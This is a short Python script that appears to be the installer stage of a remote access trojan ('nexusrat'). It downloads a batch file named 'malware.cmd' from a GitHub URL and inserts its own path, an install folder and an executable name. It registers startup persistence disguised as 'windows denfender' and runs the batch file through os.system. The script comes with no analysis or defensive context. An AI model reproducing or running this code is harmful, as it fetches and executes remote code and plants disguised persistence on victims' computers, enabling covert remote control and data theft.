import requests
import os

current_directory = os.getcwd()
startupvar = os.path.basename(current_directory)
startupurl = "https://raw.githubusercontent.com/hai723/smart-startup/main/malware.cmd"
startup = requests.get(startupurl).text
startuppath = "temp.cmd"

foldernamestart = "nexusrat"
namestartup = "windows denfender"
namefile = "software.exe"
pathfile = os.path.realpath(__file__)

startup = startup.replace("filee", pathfile)
startup = startup.replace("folderr", foldernamestart)
startup = startup.replace("namefileh", namefile)
startup = startup.replace("startt", namestartup)

with open(startuppath, "w", encoding="utf-8") as file:
    file.write(startup)
def startup():
    command = f'call "{startuppath}"'
    os.system(command)

if startupvar != foldernamestart:
    startup()